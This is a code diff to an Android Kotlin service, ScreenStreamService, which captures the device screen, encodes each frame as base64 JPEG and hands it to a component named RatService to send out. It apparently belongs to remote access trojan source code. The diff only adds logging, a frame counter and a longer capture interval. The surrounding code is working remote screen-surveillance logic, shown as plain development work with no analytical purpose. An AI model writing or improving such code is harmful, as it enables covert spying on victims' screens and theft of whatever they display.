@@ -26,28 +26,32 @@ class ScreenStreamService : Service() {
         const val TAG = "ScreenStream"
         const val NOTIF_ID = 201
         @Volatile var isStreaming: Boolean = false
-        @Volatile var intervalMs: Long = 120L
+        @Volatile var intervalMs: Long = 150L
     }
 
     private var virtualDisplay: VirtualDisplay? = null
     private var imageReader: ImageReader? = null
     private var running = false
     private var handler: Handler? = null
+    private var frameCount = 0
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        Log.i(TAG, "onStartCommand")
+
         startForeground(NOTIF_ID, buildNotification())
 
-        val interval = intent?.getLongExtra("interval", 120L) ?: 120L
+        val interval = intent?.getLongExtra("interval", 150L) ?: 150L
         intervalMs = interval
 
         if (!ScreenCapture.isReady()) {
-            Log.w(TAG, "MediaProjection not ready — skip")
+            Log.e(TAG, "❌ MediaProjection NOT ready — stop")
             stopSelf()
             return START_NOT_STICKY
         }
 
         isStreaming = true
         running = true
+        frameCount = 0
         handler = Handler(Looper.getMainLooper())
 
         startVirtualDisplay()
@@ -84,6 +88,8 @@ class ScreenStreamService : Service() {
             val height = (metrics.heightPixels * scale).toInt()
             val dpi = (metrics.densityDpi * scale).toInt()
 
+            Log.i(TAG, "Virtual display ${width}x${height}")
+
             imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
 
             virtualDisplay = ScreenCapture.getProjection()?.createVirtualDisplay(
@@ -94,8 +100,10 @@ class ScreenStreamService : Service() {
                 null,
                 handler
             )
+
+            Log.i(TAG, "✅ Virtual display created")
         } catch (e: Exception) {
-            Log.e(TAG, "startVirtualDisplay error", e)
+            Log.e(TAG, "❌ startVirtualDisplay error", e)
         }
     }
 
@@ -125,7 +133,19 @@ class ScreenStreamService : Service() {
                     cropped.compress(Bitmap.CompressFormat.JPEG, 45, bos)
                     val b64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP)
 
-                    RatService.instance?.sendFrame("screen_frame", b64)
+                    frameCount++
+                    if (frameCount % 10 == 0) {
+                        Log.i(TAG, "Frame #$frameCount size=${b64.length}")
+                    }
+
+                    val sent = RatService.instance?.let { svc ->
+                        svc.sendFrame("screen_frame", b64)
+                        true
+                    } ?: false
+
+                    if (!sent && frameCount % 10 == 0) {
+                        Log.w(TAG, "⚠️ RatService.instance null — frame not sent")
+                    }
                 } catch (e: Exception) {
                     Log.e(TAG, "encode error", e)
                 } finally {
@@ -140,6 +160,7 @@ class ScreenStreamService : Service() {
     }
 
     override fun onDestroy() {
+        Log.i(TAG, "onDestroy — total frames=$frameCount")
         running = false
         isStreaming = false
         try { virtualDisplay?.release() } catch (_: Exception) {}
